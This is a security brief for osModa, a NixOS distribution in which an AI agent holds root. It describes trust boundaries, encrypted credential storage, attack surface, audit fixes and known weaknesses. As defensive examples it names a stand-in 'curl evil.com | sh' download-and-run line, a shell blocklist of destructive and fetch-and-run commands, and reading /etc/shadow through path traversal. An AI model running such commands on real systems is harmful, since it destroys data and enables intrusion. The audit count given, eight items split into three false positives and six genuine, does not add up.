# Security & State of osModa

*Last updated: 2026-04-18. Written as a checkpoint after the v1.1 API production-readiness pass and the v1.2 modular-runtime refactor. This document is meant to be honest, not flattering — if you're weighing whether to deploy osModa on a real server, or whether to send it your Claude Pro OAuth token, read it as a security brief, not marketing copy.*

---

## TL;DR

osModa is a NixOS distribution where an AI agent has root. That sentence is either very interesting or very scary, depending on how you read it. This document exists to explain why it's deliberate, what actually protects you when the agent is wrong, and what kind of threats the design does and doesn't defend against.

As of v1.2, the agent runtime is modular — you can swap between Claude Code and OpenClaw engines, bring your own Claude Pro subscription or a pay-per-token API key, and change any of it from a dashboard without SSH'ing in. The configuration is encrypted at rest, hot-reloadable without dropping WebSocket sessions, and audited through a hash-chained ledger.

The system has four real trust boundaries. Every other "security feature" rolls up into those four. If you understand what each one protects — and what happens when it fails — you understand the threat model.

---

## What osModa actually is, today

Ten Rust daemons, one TypeScript gateway, ninety-one structured tools, nineteen skills, one NixOS module, and a single source of truth. It runs on a real server (bare metal, cloud VM, or KVM) — not inside a container, because the daemons need systemd and kernel access. Docker, LXC, WSL, and OpenVZ are all incompatible by design.

The ten daemons communicate over Unix sockets, all set to mode `0600` at creation. Two of them open a network port: `osmoda-mesh` on TCP 18800 for peer-to-peer agent communication (Noise_XX handshake + ML-KEM-768 hybrid post-quantum key exchange), and `osmoda-gateway` on TCP 18789 for HTTP + WebSocket traffic bound to `127.0.0.1` only. Everything externally reachable goes through nginx, which terminates TLS and forwards to the gateway.

The gateway is the only process with a persistent connection to the outside world. It's also the only process with any reason to hold a credential long-term. This is where the v1.2 refactor changes the picture: the gateway is now a composition root that reads agent config from `/var/lib/osmoda/config/agents.json` and decrypts credentials on demand from `credentials.json.enc`. Before v1.2, each server was welded to one runtime at NixOS config time. Changing from OpenClaw to Claude Code meant a rebuild. Now it's a PATCH, a SIGHUP, and two seconds — and in-flight chat sessions keep running on their original driver + credential snapshot until they finish.

This isn't a trivial ergonomic win. It changes the security posture: a credential is now a first-class object with a lifecycle (created, tested, used, rotated, deleted), and the system enforces that lifecycle rather than leaving it to operator discipline.

### What's mature vs what's early

| Area | State | Notes |
|---|---|---|
| agentd + hash-chained ledger | Mature | 321+ events verified on live servers with zero broken links |
| Modular runtime (v1.2) | Shipped | claude-code + openclaw drivers; hot-reload via SIGHUP |
| Credential store (AES-256-GCM) | Shipped | Single-tenant; master key on local disk |
| Public v1 API | Shipped | Idempotency, structured errors, token expiry/revoke, rate limits |
| `@osmoda/client` TS SDK | Shipped | Handwritten to mirror the OpenAPI spec |
| Self-healing skill | Functional | Works on known failure patterns |
| teachd self-optimization | Functional | Pattern detection + auto-skill generation live |
| P2P mesh + rooms | Functional | Noise_XX + ML-KEM-768, chat verified across 3 servers |
| Fleet SafeSwitch | Functional | Quorum voting implemented; not tested at scale |
| Multi-region replication | Not shipped | Single-region per server today |
| SOC2 / audit certification | Not pursued | No plans in the near term |

---

## The security model in practice

### Why the agent has root

osModa gives its agent root access. Not because that's aggressive — because it's honest. The agent IS the operating system's management interface, the same way `systemd` is. Pretending otherwise by wrapping it in a reduced-privilege shim just moves the trust boundary somewhere less visible.

The safety model that replaces traditional permission-based restriction has four pieces:

1. **Structured access, not shell access.** The agent never runs raw shell commands through a terminal interpreter. It calls typed tools over MCP (or OpenClaw's plugin system). `system_query("processes")` returns structured JSON. `file_read(path, offset, limit)` returns bytes with validated arguments. There's no prompt injection that converts "please summarize my logs" into `curl evil.com | sh`, because the agent has no interface that understands that syntax.

2. **Every mutation is an event.** Every tool that changes system state creates a SHA-256 hash-chained entry in `agentd`'s ledger. `agentctl verify-ledger` walks the chain and confirms nothing has been edited. Tamper-evident. Verifiable offline.

3. **Atomic rollback via NixOS.** Every system change is a generation. If the agent deploys a bad config, `nixos-rebuild switch --rollback` reverts the entire OS state to the previous working generation — kernel, systemd units, network config, everything. `osmoda-watch`'s SafeSwitch runs this automatically when health checks fail after a deploy.

4. **Approval gates for destructive ops.** Anything that can't be cleanly rolled back — `rm -rf` on a data volume, wallet signatures that send real funds, tearing down an NFS mount — goes through `approval_request`/`approval_approve` with a time-limited token.

These are not permission boundaries the agent can escalate past. They're reversibility guarantees. When the agent is wrong — and it will be — the system can undo the wrongness.

### The four real trust boundaries

Every security claim osModa makes rolls up into four places:

1. **SSH ingress.** Protected by Hetzner key-based authentication with the spawn management key (`spawn_mgmt_ed25519`) plus whatever SSH keys the operator added to `authorized_keys`. PasswordAuthentication is off. PermitRootLogin is key-only. If this boundary fails, a remote attacker has a shell as root on your server — full game over.

2. **Gateway-token at rest.** Lives in `/var/lib/osmoda/config/gateway-token`, mode `0600`, root-owned, 64 hex chars from `/dev/urandom`. Every WebSocket connection to `/ws` and every authenticated call to `/config/*` requires `Authorization: Bearer <token>`. If this file is read by an unauthorized process, the attacker can chat with the agent (using the legitimate operator's credential), inspect and edit agent config, and add arbitrary credentials. Because the agent has root, this is effectively root-equivalent via the chat interface. The comparison at the endpoint is `crypto.timingSafeEqual` so a LAN-local attacker can't byte-at-a-time discover it.

3. **Credential store master key.** Lives in `/var/lib/osmoda/config/.credstore-key`, mode `0600`, root-owned, 32 bytes from `/dev/urandom`. It AES-256-GCM-encrypts `credentials.json.enc`, which holds every OAuth token and API key you've configured. If this file leaks, the attacker can decrypt your credentials file — but you'd also need to leak the ciphertext alongside it (they're typically leaked together, since both live in the same directory). What this means in practice: your Claude Pro subscription token and your Anthropic API key are as safe as root on your server. If root is compromised, so are they.

4. **Spawn-app session cookies.** Used only on the hosted spawn.os.moda dashboard (not relevant for self-hosted deployments). Signed with a per-instance HMAC secret, `httponly`, `secure`, `SameSite=lax`. Cookie theft via XSS is blocked by the `httponly` flag and a strict CSP; network theft is blocked by `secure`-only transmission. The signing secret is ephemeral — rotating it invalidates every session, which is sometimes exactly what you want.

Notice what's **not** in this list: tool-level permissions, rate-limit buckets, Content-Security-Policy headers, signed webhooks, the bubblewrap sandbox for untrusted tools, the nftables firewall, systemd `ProtectSystem=strict` on the daemons. All of those exist. None of them are primary. They're defense in depth, not the trust boundary. If any one of them is misconfigured or bypassed, the four boundaries above still hold. If any one of the four boundaries breaks, the defense-in-depth layers slow the blast but do not stop it.

### Things the model does not protect against

- **A compromised Anthropic account.** If someone steals your Claude Pro OAuth token out-of-band (from your laptop, a phishing attack, a browser extension), they can use it to talk to Claude and run up bills. osModa doesn't know your token was compromised. That's why the credential-revoke endpoint exists: when you suspect a leak, revoke the osModa-side credential and rotate the Anthropic-side password separately.
- **A malicious package in your NixOS flake inputs.** If you add a flake input from an untrusted source, you've imported arbitrary build logic. NixOS sandbox reduces but doesn't eliminate this.
- **An attacker with physical access.** Cold-boot attacks, USB-inserted devices, DMA attacks. osModa makes no claim here.
- **DNS poisoning affecting the credential probe.** Our SSRF defense blocks literal private IPs in `base_url`, but a hostname that *resolves* to a private IP on next lookup would bypass the check. DNS pinning would fix it; we haven't shipped that yet.
- **Quantum attacks against TLS.** The mesh between osModa servers uses ML-KEM-768 post-quantum key exchange. The gateway's TLS termination (nginx) does not. Low urgency today; worth tracking.

---

## Attack surface by entry point

### External

**`443/tcp` (HTTPS, via nginx).** Serves the dashboard static files, the public v1 API (`/.well-known/agent-card.json`, `/api/v1/*`), and proxies WebSocket upgrades to the gateway. Every v1 endpoint is instrumented with request IDs, structured errors, and rate limits. The public write path — `POST /api/v1/spawn/:planId` — is x402-gated (payment required before provisioning). Idempotency-Key headers ensure a retry after a network blip doesn't double-charge.

**`22/tcp` (SSH).** Hetzner firewall rules allow SSH from the public internet by default. For hardened deployments you'd restrict to a jump host or VPN. The spawn management key is generated per-deployment and lives only on the spawn server, not in version control.

**`18800/tcp` (mesh peer port).** Only opens when the mesh daemon is enabled. Noise_XX handshake before any packet is accepted. Invite-based pairing with short-TTL codes. No peer discovery, no gossip without explicit invites. This port is mostly dormant today because few osModa instances pair with each other outside testing.

### Internal (via gateway)

**`/ws` (WebSocket chat).** Bearer-authed. Heartbeat every 30 s, idle-close after 10 min, backpressure enforced at 1 MB buffered per client, max 3 concurrent sessions per token. These aren't theoretical: the backpressure actually drops frames to slow clients rather than buffering indefinitely.

**`/config/*` (REST config API).** Bearer-authed with timing-safe comparison. Writes are atomic `tmp + rename`. Path fields (`profile_dir`, `system_prompt_file`) are validated against a prefix allowlist to prevent authed-path-traversal to `/etc/shadow`. Credential count capped at 64 per instance; secret length capped at 4096 bytes.

**`/telegram` (Telegram bot webhook).** Drops updates from usernames not in the `allowed_users` list. Also bandwidth-capped at 1 MB per update.

### Inside the box

The 91 MCP tools exposed by `osmoda-mcp-bridge` are the agent's interface to the system. Every tool has a typed schema and an `agentd` contract. Destructive operations (apps_remove, service_restart of a critical unit, wallet_send) route through `approval_request` or a SafeSwitch. `sandbox_exec` runs tier-2 untrusted code in bubblewrap with no network access and a minimal filesystem overlay.

The `shell_exec` tool — the agent's escape hatch — has a 17-pattern blocklist (`rm -rf /`, `dd of=/dev/`, `mkfs`, `curl | sh`, and friends), a 30-request-per-minute rate limit, and a 180-second subprocess timeout. It's not a security primitive; it's a guardrail. The real safety for `shell_exec` comes from the atomic rollback guarantee: if the agent uses it to edit NixOS config in a way that breaks boot, `nixos-rebuild switch --rollback` saves you.

---

## What the last two weeks of security work did

### Public API hardening (v1.1.0, shipped April 17)

Five phases, all live on spawn.os.moda:

- **Idempotency on spawn.** `POST /api/v1/spawn/:planId` honors `Idempotency-Key`; a retry with the same key replays the cached response for 24 hours. Caching happens *before* x402 payment middleware, so a retry after a network drop doesn't re-charge the caller. (This was a real bug: the first version cached after payment, leaving retries exposed.)
- **Structured error envelope.** Every error response now returns `{code, message, detail?, request_id, error}`. The legacy `error` field remains as an alias for one release to keep old clients working. This makes SDK generation sane.
- **Token lifecycle.** `osk_` tokens now carry metadata: `created_at`, `expires_at` (default 1 year), `revoked_at`. `DELETE /api/v1/tokens/:token_id` revokes self; subsequent use returns 401 with `code: "token_revoked"`.
- **OpenAPI v1.1.0.** Full schemas, `bearerAuth` security scheme, examples, `x-websocket` extension for chat documentation, `Retry-After` on 429s.
- **WebSocket hardening.** Heartbeat, idle close, enforced backpressure (drops frames to paused clients), 3-session cap per token.

### Modular runtime (v1.2.0, shipped April 18)

- **Driver interface** with `claude-code` and `openclaw` drivers. Adding a future runtime (Codex, Bedrock, custom) is one file.
- **Encrypted credential store.** AES-256-GCM with auth tag verification. Decryption validates envelope format and IV/tag byte length — corrupted files refuse to load rather than silently using garbage.
- **Hot-reloadable agents.json.** SIGHUP reloads; in-flight sessions keep their original driver + credential snapshot; new sessions see the new config. Zero WebSocket drops.
- **Per-server dashboard UI.** Engine tab with Credentials, Agents, Available engines sections. No SSH, no rebuild. Save triggers SIGHUP on the customer gateway.

### Post-audit hardening (b8bded0)

An independent audit after v1.2 flagged eight items; three were false positives (assuming multi-tenant when osModa is single-tenant) and six were genuine:

1. `printf %q` quoting for `$PHASE2_ARGS` passthrough in install.sh — closes a benign-but-breakable bug where credential labels with spaces would word-split.
2. `crypto.timingSafeEqual` for Bearer auth in config API.
3. Per-agent serialization + atomic write for the OpenClaw driver's `auth-profiles.json`.
4. SSRF blocklist for credential `base_url` (HTTPS-only, rejects loopback / link-local / RFC1918 / metadata endpoints).
5. Path allowlist for `agent.system_prompt_file` + `agent.profile_dir` — closes an authed file-exfiltration primitive where `/etc/shadow` could be loaded as a system prompt.
6. `/config/credentials` hard-capped at 64 per instance; secret length capped at 4096 bytes; decrypt envelope validation rejects malformed files.

Plus a `.gitignore` bug that was silently excluding the module source file `packages/osmoda-gateway/src/credentials.ts` from commits. That would have broken CI builds of a clean checkout.

---

## Known weaknesses and accepted risks

I'd rather list these plainly than let you discover them later.

**Secrets briefly visible in argv during install.** `install.sh` passes API keys to node subprocesses via argv. On a modern Linux with `ptrace_scope=1`, `ps auxww` is restricted to root. During the 30 seconds of a spawn install this is the only process running anyway. But on a permissive kernel or a compromised `ps`, the window exists. Post-install the secrets are in the encrypted store and argv is gone.

**Single-tenant trust model.** Every osModa VM assumes exactly one operator. We don't enforce isolation between "users" of a VM because there are no users — just the one root operator and the agent. If you share a VM between two humans, assume each can read everything the other has.

**OpenClaw persistence.** The OpenClaw driver writes `auth-profiles.json` to `/root/.openclaw/agents/<id>/agent/` at session start. File is `0600`, atomically written, serialized per-agent. But the file does persist between sessions. If OpenClaw is compromised at runtime, the file on disk is one more surface. Hard to fix without rewriting OpenClaw; the mitigation is: don't use OpenClaw if your threat model can't tolerate this.

**Dependabot flags 26 alerts on the public repo.** These are transitive npm dependencies — mostly older versions of `ws` and `express`. None are in direct dependencies of code we wrote. An `npm audit fix` sweep is straightforward but hasn't happened in this sprint.

**No DNS pinning on `base_url`.** The SSRF defense is a prefix check on the URL's hostname component. A hostname that resolves to a private IP on next DNS query would bypass. Low priority because the attacker needs gateway-token already, and can do more damage via other means.

**Quantum-era TLS.** Mesh is post-quantum. Everything else isn't. When Anthropic's API supports hybrid PQ TLS (as Cloudflare has started rolling out), we can pick it up for free via curl. Today, not a concern.

**Gateway-token rotation requires a restart.** There's no "rotate this token" endpoint yet. You'd have to write a new value to `/var/lib/osmoda/config/gateway-token` and `systemctl restart osmoda-gateway`. Easy to add, not critical today.

---

## If you deploy osModa today

Assuming you're running it yourself on a single-tenant VM:

**Configure before first use**

- Add your SSH public key to the installer (`--ssh-key`), or the Hetzner API if spawning via spawn.os.moda. Disable password SSH.
- Add at least one credential at install time via `--credential` (OAuth is cheaper for heavy use; API key is fine for light). The dashboard Engine tab works too if you'd rather do it after the agent is running.
- Pick your runtime. Claude Code is the default and recommended; OpenClaw is for folks with an existing plugin ecosystem to preserve.

**Monitor**

- `agentctl verify-ledger` should run green. If it ever returns non-zero, something has tampered with the audit trail — investigate immediately.
- `/health` endpoint on the gateway (`:18789`) returns uptime, agent count, credential count. Good Prometheus target.
- Watch the teachd optimization suggestions — if it's proposing the same fix repeatedly, the underlying cause isn't being addressed.

**Accept**

- The agent has root. It can and will surprise you occasionally. NixOS rollback is your safety net; use it without hesitation when needed.
- Your credentials live encrypted on the VM's disk. If the VM is compromised, the credentials are compromised. Rotate at the provider (Anthropic console, OpenAI dashboard) whenever you rebuild a server.
- If you're connecting multiple osModa instances via mesh, they trust each other at the application layer. Pair deliberately.

---

## Where this is going

Near-term (next two weeks):
- Per-server runtime switching rolled out to existing customer servers via redeploy, not just fresh spawns.
- A real Prometheus/OpenTelemetry exporter for the gateway and daemons.
- Dependabot cleanup on the public repo.

Medium-term (next two months):
- Gateway-token rotation endpoint.
- Multi-operator support for a single VM (if real demand appears — today we see none).
- DNS pinning on `base_url` for the credential probe.

Long-term:
- Formal security audit by an outside firm, if the product reaches enough users to make that worth paying for.
- Replace the blanket `kernel.yama.ptrace_scope` assumption with explicit unit-level `NoNewPrivileges` and the full `systemd.exec` hardening manifest.

osModa is not a finished product. It's a working system with a coherent architecture and known gaps. The security story is not "trust us because we have a lot of features." It's "here are four files; if root-owned `0600` files on your own server are acceptable for your threat model, this is safe; if not, it isn't."

If anything in this document is wrong, ambiguous, or out of date, file an issue at [github.com/bolivian-peru/os-moda](https://github.com/bolivian-peru/os-moda). The hash of the commit that produced the current code is visible on every page of the dashboard and in `/health`; security statements below that hash are verifiable.
